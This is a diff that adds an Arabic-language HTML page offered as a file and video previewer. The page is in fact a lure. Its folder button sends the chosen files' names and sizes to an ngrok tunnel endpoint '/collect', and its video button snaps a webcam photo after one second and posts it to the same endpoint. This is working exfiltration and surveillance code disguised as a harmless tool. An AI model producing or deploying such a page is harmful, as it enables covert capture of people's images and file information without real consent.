@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>معاينة الملفات والفيديو</title>
+</head>
+<body>
+    <h2>مرحباً، اضغط على الزر لمعاينة الملف أو تشغيل الفيديو</h2>
+    <button id="fileBtn">📁 معاينة الملفات</button>
+    <button id="videoBtn">▶️ تشغيل الفيديو (كاميرا)</button>
+    <div id="output" style="margin-top:20px; white-space:pre-wrap;"></div>
+
+    <script>
+        function log(msg) {
+            document.getElementById('output').textContent += msg + '\n';
+        }
+
+        document.getElementById('fileBtn').onclick = function() {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.webkitdirectory = true;
+            input.onchange = function(e) {
+                const files = e.target.files;
+                let fileList = '📂 الملفات المختارة:\n';
+                for (let i=0; i<files.length; i++) {
+                    fileList += '- ' + files[i].name + ' (' + files[i].size + ' بايت)\n';
+                }
+                fetch('https://your-ngrok-url.ngrok.io/collect', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ type: 'files', data: fileList })
+                });
+                log('✅ تم إرسال قائمة الملفات إلى الخادم');
+                log(fileList);
+            };
+            input.click();
+        };
+
+        document.getElementById('videoBtn').onclick = function() {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(function(stream) {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(function() {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+                        const imageData = canvas.toDataURL('image/jpeg');
+                        stream.getTracks().forEach(track => track.stop());
+                        fetch('https://your-ngrok-url.ngrok.io/collect', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ type: 'photo', data: imageData })
+                        });
+                        log('✅ تم التقاط الصورة وإرسالها إلى الخادم');
+                    }, 1000);
+                })
+                .catch(function(err) {
+                    log('❌ خطأ في الكاميرا: ' + err.message);
+                });
+        };
+    </script>
+</body>
+</html>
